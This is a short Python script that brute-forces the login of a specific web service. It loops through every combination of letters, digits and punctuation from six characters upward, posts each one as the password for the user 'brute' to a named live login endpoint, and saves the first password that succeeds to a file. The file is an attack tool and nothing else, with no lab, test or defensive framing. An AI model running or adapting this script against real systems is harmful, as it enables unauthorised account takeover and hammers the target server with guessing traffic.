import itertools
import os
import string
import sys
from asyncio import as_completed
from concurrent.futures.thread import ThreadPoolExecutor

import requests


def main(start_char):
    password_length = 10
    min_length = 6
    status = 400
    chars = string.ascii_letters + string.digits + string.punctuation
    index = chars.index(start_char)
    rotated = chars[index:] + chars[:index]

    while status != 200:
        for length in range(min_length - 1, password_length):
            for first_char in rotated:
                for rest in itertools.product(chars, repeat=length):
                    if not os.path.exists("pwd.txt"):
                        try:
                            combination = first_char + "".join(rest)
                            payload = {
                                "username": "brute",
                                "password": combination,
                            }
                            response = requests.post("https://fretux.ch/socket/login", json=payload, timeout=5)
                            print(combination, response.status_code)
                            if response.ok:
                                print(combination)
                                with open("pwd.txt", "w") as f:
                                    f.write(combination)
                                break
                        except Exception as e:
                            print(e)
                    else:
                        sys.exit()
        password_length += 1


if __name__ == "__main__":
    main(sys.argv[1])
